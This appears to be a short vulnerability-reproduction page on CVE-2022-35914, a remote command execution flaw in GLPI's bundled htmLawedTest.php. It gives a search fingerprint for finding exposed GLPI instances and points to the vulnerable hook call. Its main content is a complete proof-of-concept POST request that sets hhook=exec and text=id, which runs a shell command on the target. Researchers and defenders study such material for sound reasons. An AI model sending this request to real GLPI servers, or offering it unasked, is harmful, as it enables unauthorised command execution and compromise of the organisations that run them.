# GLPI htmlLawedTest.php Remote Command Execution Vulnerability CVE-2022-35914

## Vulnerability Description

GLPI is an open source IT and asset management software for individual developers. 

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">GLPI</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">title="GLPI"</span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1664764583921-930e166a-74b4-48a3-af34-9bcb1e20fa0f.png)

The file that occurs with the problem is **htmLawedTest.php, which is from the third-party library PHP Labware

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1664889433165-f745a7dc-7774-4ff0-abe6-c96d4f2f796c.png)



```sql
https://www.bioinformatics.org/phplabware/internal_utilities/htmLawed/
```

Receive parameters in htmlLawedTest.php and pass in method htmlLawed

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1664893382208-bf44fba7-3b95-4197-a2bb-d139ec21f1d9.png)

Follow up file in htmlLawed.php

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1664946511507-81cddbd6-de1a-4df9-b7cb-da460b4c1516.png)

```sql
if($C['hook']){$t = $C['hook']($t, $C, $S);}
```

Here you can see that the parameters are user-controlled parameters. When the control parameters hhook is exec and text is executed, the command execution vulnerability is caused.

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1664946759678-b3032a67-4717-44f7-a00d-101e690f8b53.png)

Verify POC

```sql
/vendor/htmlawed/htmlawed/htmLawedTest.php
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1664764633952-b6bb3e54-7b6a-49c2-94b6-39fd5cb0d032.png)

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1664764647931-b53cbf79-aa45-48d4-9581-f88a58ff1b61.png)

After accessing the page, you can get sid and token before sending the request packet

```sql
POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 88
Content-Type: application/x-www-form-urlencoded

token=a79cf121bde57fe0e3cc0f247f77961a&text=id&hhook=exec&sid=h1c0vk004dvulal5nj8i6en44e
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1664764696143-4f92e328-735b-4587-987d-1552817796f1.png)